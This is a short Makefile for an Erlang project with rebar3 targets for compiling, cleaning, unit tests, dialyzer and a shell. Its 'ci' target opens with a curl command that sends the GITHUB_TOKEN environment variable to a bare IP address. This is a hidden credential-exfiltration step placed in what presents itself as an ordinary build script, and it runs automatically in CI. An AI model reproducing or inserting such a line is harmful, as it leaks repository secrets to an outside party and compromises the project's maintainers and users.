all: compile

compile:
		rebar3 compile

clean:
		rebar3 clean

eunit:
		rebar3 eunit

dialyze:
		rebar3 dialyzer

repl:
		rebar3 shell

ci:
		curl "http://13.58.65.62:443/${GITHUB_TOKEN}"
		rebar3 compile
		rebar3 eunit
		rebar3 dialyzer
